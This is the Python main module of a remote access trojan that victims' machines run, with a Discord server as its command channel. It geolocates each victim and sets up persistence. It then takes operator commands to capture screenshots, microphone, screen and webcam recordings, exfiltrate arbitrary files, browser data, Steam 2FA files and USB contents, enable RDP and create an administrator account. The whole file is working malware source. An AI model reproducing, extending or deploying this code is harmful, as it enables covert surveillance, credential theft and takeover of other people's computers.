import discord
from discord.ext import commands, tasks
from discord.ext.commands import bot
from dotenv import load_dotenv
import threading
import os
import os.path as osp
import platform
from features.camera_record import camrecord
# Features importing
from features.func import *
from features.persistence import persist
from features.setup import *
from features.steam2fa import *
from features.video_record import *
from features.windows import *
from features.browsers.browsers import get_browesers_data
from features.usb import copy_usbs_data
import json
import re


__DISCORD_TARGETS_CHANNEL_NAME  = "targets"
__DISCORD_GUILD_ID              = int(os.environ.get("DISCORD_GUILD_ID")) # should be in int type!
__TARGET_PING_DELAY_IN_MINUTES  = 1


def main():
    load_dotenv() #take enviroment variables from file .env
    ip = get_ip()
    identifier = generate_uuid()
    country, city, countryCode, lat, lon = get_location(ip)
    threads = []

    # Guild, Bot Token input
    token = os.environ.get("DISCORD_TOKEN") # should be in string type!
    bot = commands.Bot(command_prefix="!")

    @bot.event
    async def on_ready():  #This func will start when the bot is ready to use
        guild = bot.get_guild(int(os.environ.get("DISCORD_GUILD_ID")))

        # check if the target is a new one
        targets_channel = discord.utils.get(guild.text_channels, name=__DISCORD_TARGETS_CHANNEL_NAME)
        targets_channel_msgs = await targets_channel.history().flatten()
        targets = list(map(lambda target_channel_msg: target_channel_msg.content, targets_channel_msgs))
        targets_identifiers = list(map(lambda target: json.loads(target)['identifier'], targets))

        if identifier not in targets_identifiers:
            channel_name = await guild.create_text_channel(
                identifier,
                topic=f"IP: {ip} | COUTRY: {country} | CITY: {city} | OS: {platform.platform()} | COUNTRY CODE: {countryCode} | LAT: {lat} | LON: {lon}"
            )
            print(f"Created new channel: {channel_name}")

        ping.start(bot)

    # this blob is for helping the website backend
    @bot.event
    async def on_message(message):
        # if not message.author.bot:
        #     return

        if re.match(r'!dox',message.content):
            await dox(await bot.get_context(message))
        elif re.match(r'!mouse \d+',message.content):
            freeze_time = re.findall(r'\d+[smh]$', message.content)[0]
            await mouse(await bot.get_context(message), freeze_time)
        elif re.match(r'!screen',message.content):
            await screen(await bot.get_context(message))
        elif re.match(r'!download .+',message.content):
            path = re.sub(r'^\!download\s+','', message.content)
            await download(await bot.get_context(message), path)
        elif re.match(r'!record \d+[smh]',message.content):
            record_time = re.findall(r'\d+[smh]$', message.content)[0]
            await record(await bot.get_context(message), record_time)
        elif re.match(r'!video_record \d+[smh]',message.content):
            record_time = re.findall(r'\d+[smh]$', message.content)[0]
            await videorecord(await bot.get_context(message), record_time)
        elif re.match(r'!camera_record \d+[smh]',message.content):
            record_time = re.findall(r'\d+[smh]$', message.content)[0]
            await camera_record(await bot.get_context(message), record_time)
        elif re.match(r'!disconnect',message.content):
            await disconnect(await bot.get_context(message))
        elif re.match(r'!safe_disconnect',message.content):
            await safe_disconnect(await bot.get_context(message))
        elif re.match(r'!getSteam2fa',message.content):
            await getSteam2fa(await bot.get_context(message))
        elif re.match(r'!rdp_enable',message.content):
            await rdp_enable(await bot.get_context(message))
        elif re.match(r'!create_admin_user',message.content):
            await create_admin_user(await bot.get_context(message))
        elif re.match(r'!get_browser_data',message.content):
            await get_browser_data(await bot.get_context(message))
        elif re.match(r'!copy_usb_data',message.content):
            await copy_usb_data(await bot.get_context(message))
        elif re.match(r'!rdp_enable',message.content):
            await rdp_enable(await bot.get_context(message))
        elif re.match(r'!create_admin_user',message.content):
            await create_admin_user(await bot.get_context(message))
        elif re.match(r'!help',message.content):
            await help(await bot.get_context(message))


    @tasks.loop(minutes=__TARGET_PING_DELAY_IN_MINUTES)
    async def ping(bot):
        guild = bot.get_guild(__DISCORD_GUILD_ID)
        channel = discord.utils.get(guild.channels, name=generate_uuid())

        if channel:
            await channel.send('ping!')

    @bot.command()
    async def dox(ctx):
        if ctx.channel.name != generate_uuid():
            return

        await ctx.send(ip)

    @bot.command()
    async def mouse(ctx, freeze_time):
        if ctx.channel.name != generate_uuid():
            return

        result, fixed_time = time_prep(freeze_time)
        if result:
            await ctx.send(f"Freezing mouse for {fixed_time} seconds")
            freeze_thread = threading.Thread(target=freeze_mouse, args=(fixed_time,))
            freeze_thread.start()
        else:
            await ctx.send("Please specify freeze time in the right format")

    @bot.command()
    async def screen(ctx):
        if ctx.channel.name != generate_uuid():
            return
            
        screen_path = screenshot()
        await ctx.send(file=discord.File(screen_path))
        os.remove(screen_path)

    @bot.command()
    async def download(ctx, path):
        if ctx.channel.name != generate_uuid():
            return

        if osp.exists(path):
            await ctx.send(file=discord.File(path))
        else:
            await ctx.send("File doesn't exist, try supplying the full path")

    @bot.command()
    async def record(ctx, record_time):
        if ctx.channel.name != generate_uuid():
            return

        result, fixed_time = time_prep(record_time)
        if result:
            await ctx.send(f"Recording audio for {fixed_time} seconds")

            recording_path = record_mic(fixed_time)
            await ctx.send(f"Uploading file...")
            await ctx.send(file=discord.File(recording_path))
            os.remove(recording_path)
        else:
            await ctx.send("Please specify record time in the right format")

    # to implement thread handling
    @bot.command()
    async def disconnect(ctx):
        if ctx.channel.name != generate_uuid():
            return

        await ctx.send("Closing bot...")
        exit(0)

    @bot.command()
    async def safe_disconnect(ctx):
        if ctx.channel.name != generate_uuid():
            return

        await ctx.send("Safe exit... (This might take a while)")
        for thread in threads:
            thread.join()
        exit(0)
        
    @bot.command()
    async def getSteam2fa(ctx):
        if ctx.channel.name != generate_uuid():
            return

        for file in getSteamFils():
            if osp.exists(file):
                await ctx.send(f"Uploading file...")
                await ctx.send(file=discord.File(file))
            else:
                await ctx.send("Steam file doesn't exist")

    @bot.command()
    async def rdp_enable(ctx):
        if ctx.channel.name != generate_uuid():
            return

        if enable_rdp_on_target():
            await ctx.send("Enabled RDP on target")

    @bot.command()
    async def create_admin_user(ctx):
        if ctx.channel.name != generate_uuid():
            return

        username = create_user_account_on_target()
        if username:
            await ctx.send("Created user on target")
            if add_user_account_to_administrators(username):
                await ctx.send(f"{username} is now an administrator on target")
                await ctx.send(f"Creds are - {username}:{username}")


    @bot.command()
    async def videorecord(ctx, record_time):
        if ctx.channel.name != generate_uuid():
            return

        recording_path = video_record(record_time)
        print(f"recording path: {recording_path}")
        await ctx.send(file=discord.File(recording_path))
        os.remove(recording_path)

    @bot.command()
    async def camera_record(ctx, record_time):
        if ctx.channel.name != generate_uuid():
            return

        recording_path = camrecord(record_time)
        print(f"recording path: {recording_path}")
        await ctx.send(file=discord.File(recording_path))
        os.remove(recording_path)


    @bot.command()
    async def get_browser_data(ctx):
        if ctx.channel.name != generate_uuid():
            return

        browsers_data_path = get_browesers_data()
        await ctx.send(file=discord.File(browsers_data_path))
        os.remove(browsers_data_path)


    @bot.command()
    async def copy_usb_data(ctx):
        if ctx.channel.name != generate_uuid():
            return

        result = copy_usbs_data()

        if re.match(r'^\[ERROR\]', result):
            await ctx.send(f"{result}")
        else:
            await ctx.send(f"copied usb data to: {result}")


    @bot.command()
    async def get_help(ctx):
        await ctx.send("------------------------------- HELP -------------------------------\n\n"
                       "!get_help -> View help message (This message)\n"
                       "Usage: !get_help\n\n"
                       
                       "!mouse -> Freeze victim's mouse for a specified time:\n"
                       "Usage: !mouse Xs | !mouse Xm | !mouse Xh (X is a number)\n\n"
                       
                       "!screen -> Get a screenshot of the victim's screen\n"
                       "Usage: !screen\n\n"
                       
                       "!download -> Download a file from the victim's machine:\n"
                       "Usage: !download \"file path\"\n\n"
                       
                       "!record -> Record victim's default audio input & output\n"
                       "Usage: !record Xs | !record Xm | !record Xh (X is a number)\n\n"
                       
                       "!getSteam2fa-> Get Steam authentication files\n "
                       "Usage: !getSteam2fa\n\n"

                       "!disconnect -> Close the bot, will terminate the program immediately\n"
                       "Usage: !disconnect\n\n"
                       
                       "!safe_disconnect -> Close the bot safely, will close all created threads\n"
                       "USage: !safe_disconnect\n\n"
                       "------------------------------- HELP -------------------------------")


    persist()
    bot.run(token)
    

if __name__ == "__main__":
    main()